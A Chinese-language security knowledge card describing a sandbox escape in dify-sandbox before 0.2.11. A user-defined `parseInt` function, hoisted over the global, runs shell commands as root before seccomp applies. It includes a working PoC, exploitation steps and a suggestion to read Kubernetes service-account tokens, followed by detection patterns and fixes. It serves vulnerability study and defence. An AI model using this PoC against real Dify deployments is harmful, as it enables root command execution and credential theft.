---
id: binary-pwn-sandbox-escape-dify-sandbox-parseint-hoisting-seccomp
title: Dify dify-sandbox < 0.2.11 JS 代码节点逃逸：用户 function parseInt 提升覆盖全局函数，在 difySeccomp 生效前以 root 执行命令
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: dify-sandbox-js-function-hoisting-seccomp-bypass
aliases:
- Dify 沙箱逃逸
- dify-sandbox RCE
- Dify 代码节点逃逸
- parseInt 函数提升覆盖
- prescript.js 拼接
- DifySeccomp 执行顺序
- CWE-1100
tags:
- dify
- javascript
- nodejs
- sandbox-escape
- seccomp
- code-node
- rce
- function-hoisting
- koffi
- cwe-1100
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: < 0.2.11
verification:
  verified_by: verifier-V167
  verified_at: '2026-11-06T13:34:54+08:00'
  notes: 已对照原文全文与4张图核对：prescript.js 在 difySeccomp 前调用 parseInt(argv[2]/argv[3])、nodejs.go InitializeEnvironment 直接 code=node_sandbox_file+code、用户 function parseInt 声明提升覆盖全局、execSync 在 seccomp/降权前以 root 执行、代码节点输出 ls -la /（图04）、CVSS 9.8/CWE-1100（图01）、修复 commit a0c74d3 的时序调整均一致。已修正卡内‘JSON.parse 可被函数声明覆盖’的技术错误（属性访问不受函数声明提升影响）及相应检测措辞。未验证点：未本机复跑；原文称获得宿主机 root，卡内按证据收敛为容器内 root、逃逸宿主机需容器配置缺陷；affected_versions 按原文‘沙盒版本低于 0.2.11’设为 < 0.2.11。无 sources/source_url、无 CVE。
---

## 一句话结论

dify-sandbox 0.2.11 之前，Node.js Runner 把 `prescript.js` 与用户代码直接字符串拼接后交给 Node.js 执行；用户代码里的 `function parseInt(){}` 会因函数声明提升覆盖全局 `parseInt`，而 `prescript.js` 在调用 `difySeccomp()` 施加 seccomp/降权之前先执行 `parseInt(argv[2])`，于是攻击者的 `parseInt` 在沙箱限制生效前以 root 权限调用 `child_process.execSync()` 执行任意命令，实现沙箱逃逸。

## 原理

- **代码拼接而非隔离上下文**：`nodejs.go` 的 `InitializeEnvironment()` 读取内嵌的 `prescript.js`，若存在 preload 则前置拼接，然后把用户代码直接追加：`code = node_sandbox_file + code`。整个脚本作为同一个 Node.js 模块执行，没有使用 `vm.runInContext` 等隔离上下文，也没有把用户代码包进独立函数作用域。
- **prescript.js 的初始化顺序**：脚本先用 `koffi.load('./var/sandbox/sandbox-nodejs/nodejs.so')` 加载负责降权的 C++ 共享库并声明 `difySeccomp`，随后依次执行 `const uid = parseInt(argv[2])`、`const gid = parseInt(argv[3])`、`const options = JSON.parse(argv[4])`，最后才调用 `difySeccomp(uid, gid, options['enable_network'])` 施加 uid/gid 降权与 seccomp 限制。
- **函数声明提升（hoisting）**：JavaScript 引擎在编译阶段会扫描整个脚本作用域，把所有 `function xxx() {}` 声明提升到顶部并优先绑定。用户代码虽然拼接在 `prescript.js` 之后，但其中声明的 `function parseInt(){}` 会在任何语句执行前覆盖全局 `parseInt`。因此 `prescript.js` 中看似正常的 `parseInt(argv[2])` 实际调用的是攻击者函数。
- **安全边界时序错误**：攻击者的 `parseInt` 内执行 `require('child_process').execSync(...)` 时，`difySeccomp()` 尚未调用，进程仍保持沙箱容器启动时的 root 权限，也没有 seccomp 过滤，于是命令以 root 执行。等 `parseInt` 返回后，`difySeccomp` 才开始限制——为时已晚。
- **为什么是“逃逸”**：dify-sandbox 的设计意图是把用户代码限制在低权限、受限 syscall 的沙箱内；该漏洞让攻击者在隔离措施建立前就取得容器内 root 命令执行，打破沙箱边界。后续可读取容器内敏感信息（API Key、内部服务地址、K8s ServiceAccount token），并在容器配置不当的情况下进一步逃逸到宿主机。
- **CVSS 与分类**：原文引用评分 CVSS 3.0 9.8（AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H），CWE-1100（系统依赖函数的隔离不足）。
- **修复思路**：调整执行顺序，确保 `difySeccomp()` 在用户代码（含被提升的函数声明）可影响任何全局函数之前生效；根因是“安全限制晚于不可信代码”，仅对 `parseInt` 做黑名单属于单点缓解，不能替代时序修复。

## 触发条件

- 目标使用 dify-sandbox < 0.2.11（原文表述“沙盒版本低于 0.2.11”）。
- 攻击者能在 Dify 工作流中加入“代码执行”节点并提交 JavaScript（拥有工作流编辑权限，或通过共享模板/应用诱导他人运行）。
- 代码节点使用 Node.js Runner，且沙箱按默认方式以 root 启动后再调用 `difySeccomp` 降权。
- 沙箱容器允许 Node.js `require('child_process')`（默认未禁用）。
- 无需网络即可执行本地命令；若要外带数据，需要沙箱具备出站能力或存在回显通道（代码节点输出即可回显）。

## 利用步骤

1. 登录 Dify，创建一个工作流，加入“代码执行”节点，语言选择 JavaScript。
2. 在节点中写两段代码：
   - `main()` 返回 `{ result: data }`，把命令输出展示到节点运行结果；
   - `function parseInt()` 覆盖全局函数，内部 `require('child_process').execSync("ls -la /", {encoding:"utf8"})` 执行命令并把输出赋给 `data`，返回 `0` 伪装成正常 `parseInt` 返回值。
3. 运行/预览工作流；Node.js 加载拼接后的脚本，函数提升使 `prescript.js` 的 `parseInt(argv[2])` 调用恶意函数，命令在 `difySeccomp` 之前以 root 执行。
4. 节点输出中查看命令结果（原文截图显示根目录列表，文件属主为 root）。
5. 进一步读取 `/var/run/secrets/kubernetes.io/serviceaccount/token`、环境变量、内部配置文件等，评估容器与集群影响。

## PoC

```javascript
function main() {
    return { result: data }; // 将命令输出返回给用户
}

// 覆盖全局 parseInt；函数声明会提升到 prescript.js 之前生效
function parseInt() {
    const { execSync } = require('child_process');
    data = execSync("ls -la /", { encoding: "utf8" });
    return 0; // 伪装正常 parseInt 返回值，避免后续逻辑报错
}
```

等价的拼接结果（说明漏洞时序）：

```javascript
// ===== prescript.js（框架预置）=====
const argv = process.argv;
const koffi = require('koffi');
const lib = koffi.load('./var/sandbox/sandbox-nodejs/nodejs.so');
const difySeccomp = lib.func('void DifySeccomp(int, int, bool)');

const uid = parseInt(argv[2]);   // 此时 parseInt 已被用户函数覆盖
const gid = parseInt(argv[3]);
const options = JSON.parse(argv[4]);

difySeccomp(uid, gid, options['enable_network']); // 安全限制太晚

// ===== 用户代码（被直接追加）=====
function parseInt() {
    const { execSync } = require('child_process');
    data = execSync("id", { encoding: "utf8" }); // 以 root 执行
    return 0;
}
```

## 变体与关联

- 变体（覆盖其他全局函数）：`prescript.js` 在 `difySeccomp` 之前还调用 `JSON.parse(argv[4])`；`JSON.parse` 是属性访问，不能被函数声明提升覆盖，但任何在该时序点之前以裸标识符调用的全局函数都可被同法覆盖。防御时不能只盯 `parseInt`，而应消除“用户代码可影响限制前执行语句”的窗口。
- 变体（preload 拼接）：`InitializeEnvironment` 在 `preload != ""` 时把 preload 前置到 `prescript.js` 之前，preload 内容同样在安全限制前执行；若 preload 可被外部影响，攻击面扩大。
- 变体（数据外带）：代码节点本身可回显命令输出；若沙箱网络开启，还可读取 K8s token、云元数据、内部 API Key，结合 [[ai-security-agent-security-dify-code-sandbox-network-egress]] 的外带通道使用。
- 关联：[[binary-pwn-sandbox-escape-ifunc-resolver-before-constructor-seccomp]]（同样是“安全限制晚于不可信代码执行”的时序缺陷，只是发生在 ELF 重定位期）、[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（Node.js 沙箱上下文逃逸）、[[binary-pwn-sandbox-escape-python-audit-hook-bypass]]（审计钩子时序/覆盖类绕过）。
- 边界：需要工作流代码节点权限；若 dify-sandbox 已升级到 >= 0.2.11，`difySeccomp` 先执行，`parseInt` 覆盖不再能抢在限制之前；命令执行范围受容器隔离与挂载限制。

## 检测与防御

- 检测代码节点：审计 JavaScript 中出现 `function parseInt`、`JSON.parse =`、`require('child_process')`、`execSync`、`spawn`、`exec` 等组合；尤其是代码节点代码同时重写全局函数并执行命令的模式。
- 检测运行时：监控 dify-sandbox 容器内 Node.js 进程在 seccomp 生效前派生出 `/bin/sh`、`bash`、`curl`、`id`、`ls` 等子进程；以 uid 0 运行的 Node.js 子进程尤其可疑；对比容器启动后短时间内的进程树。
- 修复：升级 dify-sandbox 到 >= 0.2.11；确认 `difySeccomp()`（或等价降权/seccomp 安装）在用户代码可执行之前完成；不要仅依赖对 `parseInt` 的单点过滤。
- 加固：使用 `vm.runInContext`/独立 worker 等隔离上下文执行用户代码，禁用 `require`/`process`/`child_process`；沙箱以非 root 用户启动并先降权再加载用户代码；限制网络与挂载，启用 seccomp/AppArmor。
- 防御：对工作流代码节点做静态扫描与发布审核；限制谁可以创建/修改代码节点；对共享模板中的代码节点重点审计。
